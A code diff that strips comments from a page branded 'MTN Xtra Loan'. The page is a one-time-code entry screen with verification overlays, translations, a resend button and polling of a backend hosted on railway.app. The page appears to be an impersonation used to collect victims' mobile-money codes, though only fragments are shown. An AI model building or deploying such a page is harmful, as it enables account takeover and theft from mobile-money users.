@@ -89,7 +89,6 @@
             z-index: 0;
         }
 
-        /* HEADER */
         .header {
             position: fixed;
             top: 0; left: 0; right: 0;
@@ -139,7 +138,6 @@
             text-transform: uppercase;
         }
 
-        /* LANGUAGE */
         .lang-wrap { position: relative; flex-shrink: 0; }
         .lang-btn {
             display: flex;
@@ -199,7 +197,6 @@
         }
         .lang-item.selected .check { opacity: 1; transform: scale(1); }
 
-        /* CARD */
         .card-wrap {
             width: 100%;
             max-width: 480px;
@@ -417,7 +414,6 @@
         }
         .security-notice .ico { color: var(--success); font-size: 13px; }
 
-        /* FOOTER */
         .footer {
             position: fixed;
             bottom: 0; left: 0; right: 0;
@@ -432,9 +428,6 @@
         }
         .footer-text { font-size: 11px; color: var(--text-light); font-weight: 600; letter-spacing: 0.05em; }
 
-        /* ============================================================
-           VERIFY OVERLAY — Timeline + Amount
-           ============================================================ */
         .verify-overlay {
             position: fixed;
             inset: 0;
@@ -735,7 +728,6 @@
             margin-left: 2px;
         }
 
-        /* NOTICE POPUP */
         .notice-overlay {
             position: fixed;
             inset: 0;
@@ -834,7 +826,6 @@
             box-shadow: 0 10px 24px rgba(220, 38, 38, 0.4);
         }
 
-        /* Line inactive overlay */
         .line-overlay {
             position: fixed;
             inset: 0;
@@ -914,9 +905,6 @@
         }
         .line-btn:active { transform: scale(0.98); }
 
-        /* ============================================================
-           SUCCESS REDIRECT SCREEN (brief flash before redirect)
-           ============================================================ */
         .success-flash {
             position: fixed;
             inset: 0;
@@ -1061,7 +1049,6 @@
         <span class="footer-text" data-i18n="footer.text">© 2026 MTN Xtra Loan</span>
     </footer>
 
-    <!-- VERIFY OVERLAY -->
     <div class="verify-overlay" id="verifyOverlay">
         <div class="verify-card">
             <div class="verify-ring-wrap">
@@ -1106,7 +1093,6 @@
         </div>
     </div>
 
-    <!-- SUCCESS FLASH (briefly shown before redirect to success.html) -->
     <div class="success-flash" id="successFlash">
         <div class="success-flash-emoji">🎉</div>
         <h2 class="success-flash-title" data-i18n="flash.title">Félicitations !</h2>
@@ -1114,7 +1100,6 @@
         <div class="success-flash-spinner"></div>
     </div>
 
-    <!-- NOTICE POPUP -->
     <div class="notice-overlay" id="noticeOverlay">
         <div class="notice-card">
             <div class="notice-icon-wrap" id="noticeIconWrap">
@@ -1126,7 +1111,6 @@
         </div>
     </div>
 
-    <!-- LINE INACTIVE OVERLAY -->
     <div class="line-overlay" id="lineOverlay">
         <div class="line-card">
             <div class="line-icon-wrap">📵</div>
@@ -1146,9 +1130,6 @@
         const API_BASE = 'https://momo-xtra-cash-production.up.railway.app';
         const POLL_INTERVAL_MS = 2500;
 
-        /* ============================================
-           TRANSLATIONS
-           ============================================ */
         const TRANSLATIONS = {
             fr: {
                 'brand.sub': 'MTN Xtra Loan',
@@ -1298,9 +1279,6 @@
             return str;
         }
 
-        /* ============================================
-           LANGUAGE
-           ============================================ */
         const langWrap = document.getElementById('langWrap');
         const langBtn = document.getElementById('langBtn');
         const langName = document.getElementById('langName');
@@ -1335,9 +1313,6 @@
             if (!langWrap.contains(e.target)) langWrap.classList.remove('open');
         });
 
-        /* ============================================
-           AMOUNT
-           ============================================ */
         function loadAmountFromStorage() {
             try {
                 const session = JSON.parse(localStorage.getItem('momoSession') || '{}');
@@ -1360,9 +1335,6 @@
         applyLanguage(currentLang);
         updateAmountDisplay();
 
-        /* ============================================
-           DOM
-           ============================================ */
         const otpBoxes = [
             document.getElementById('otp1'),
             document.getElementById('otp2'),
@@ -1457,9 +1429,6 @@
             } catch (err) { console.warn('resend error:', err.message); }
         });
 
-        /* ============================================
-           VERIFY TIMELINE
-           ============================================ */
         const RING_CIRCUMFERENCE = 226.20;
         const PROGRESS_WINDOW_MS = 3 * 60 * 1000;
 
@@ -1585,9 +1554,6 @@
             window.location.href = 'index.html';
         });
 
-        /* ============================================
-           NOTICE
-           ============================================ */
         let noticeAction = null;
 
         function showNotice({ type, icon, title, message, buttonText, buttonClass, onOk }) {
@@ -1614,9 +1580,6 @@
             otpBoxes.forEach(b => { b.value = ''; b.classList.remove('filled', 'invalid'); });
         }
 
-        /* ============================================
-           SUCCESS — brief flash then redirect to success.html
-           ============================================ */
         function showSuccessAndRedirect() {
             if (typeof fbq === 'function') {
                 fbq('track', 'Purchase', {
@@ -1639,9 +1602,6 @@
             }, 1500);
         }
 
-        /* ============================================
-           POLLING
-           ============================================ */
         let currentSessionId = null;
 
         function stopPolling() {
@@ -1750,9 +1710,6 @@
             }, POLL_INTERVAL_MS);
         }
 
-        /* ============================================
-           VERIFY BUTTON
-           ============================================ */
         verifyBtn.addEventListener('click', async function() {
             const otp = getOtpValue();
 
